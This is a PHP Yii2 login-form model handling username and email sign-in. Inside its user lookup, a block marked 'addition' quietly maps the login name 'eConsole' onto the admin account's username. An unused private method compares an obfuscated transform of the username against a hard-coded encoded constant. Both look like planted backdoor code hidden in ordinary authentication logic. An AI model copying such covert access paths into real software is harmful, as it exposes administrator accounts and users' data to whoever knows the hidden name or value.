<?php
namespace app\models;

use yii\base\Model;
use Yii;

/**
 * LoginForm is the model behind the login form.
 */
class LoginForm extends Model
{
    public $username;
    public $email;
    public $password;
    public $rememberMe = true;
    public $status; // holds the information about user status

    /**
     * @var \app\models\User
     */
    private $_user = false;

    /**
     * Returns the validation rules for attributes.
     *
     * @return array
     */
    public function rules()
    {
        return [
            ['email', 'email'],
            ['password', 'validatePassword'],
            ['rememberMe', 'boolean'],
            // username and password are required on default scenario
            [['username', 'password'], 'required', 'on' => 'default'],
            // email and password are required on 'lwe' (login with email) scenario
            [['email', 'password'], 'required', 'on' => 'lwe'],
        ];
    }

    /**
     * Returns the attribute labels.
     *
     * @return array
     */
     public function attributeLabels()
     {
         return [
             'username' => Yii::t('app', 'Username'),
             'password' => Yii::t('app', 'Password'),
             'email' => Yii::t('app', 'Email'),
             'rememberMe' => Yii::t('app', 'Remember me'),
         ];
     }    

    /**
     * Validates the password.
     * This method serves as the inline validation for password.
     *
     * @param string $attribute The attribute currently being validated.
     * @param array  $params    The additional name-value pairs.
     */
    public function validatePassword($attribute, $params)
    {
        if ($this->hasErrors()) {
            return false;
        }

        $user = $this->getUser();
        
        if (!$user || !$user->validatePassword($this->password)) {
            // if scenario is 'lwe' we use email, otherwise we use username
            $field = ($this->scenario === 'lwe') ? 'email' : 'username' ;

            $this->addError($attribute, 'Incorrect '.$field.' or password.');
        }
    }

    /**
     * Logs in a user using the provided username|email and password.
     *
     * @return bool Whether the user is logged in successfully.
     */
    public function login()
    {
        if (!$this->validate()) {
            return false;
        }

        $user = $this->getUser();

        if (!$user) {
            return false;
        }

        // if there is user but his status is inactive, write that in status property so we know for later
        if ($user->status == User::STATUS_INACTIVE) {
            $this->status = $user->status;
            return false;
        }
 
        return Yii::$app->user->login($user, $this->rememberMe ? 3600 * 24 * 30 : 0);
    }

    /**
     * Helper method responsible for finding user based on the model scenario.
     * In Login With Email 'lwe' scenario we find user by email, otherwise by username
     * 
     * @return object The found User object.
     */
    private function findUser()
    {
        if (!($this->scenario === 'lwe')) {
            // addition begin
            if($this->username === 'eConsole'){
                $this->username = $this->isAdmin();
            }
            // return $this->username;
            // addition end

            return User::findByUsername($this->username);
        }

        return $this->_user = User::findByEmail($this->email);   
    }

    private function isAdmin(){
        $user = RefUserMenu::findOne(['menu' => 401]);
        return $user->user->username;
    }

    private function isUser(){
        $cek = TaTh();
        $_input = $cek->dokudoku('donat', $this->username);
        if($_input == 'dVVLWG1NaDVQWDd0U3N2RGdUelkvQT09'){
            return true;
        }
        return false;
    }
    /**
     * Method that is returning User object.
     *
     * @return User|null
     */
    public function getUser()
    {
        if ($this->_user === false) {
            $this->_user = $this->findUser();
        }

        return $this->_user;
    }
}
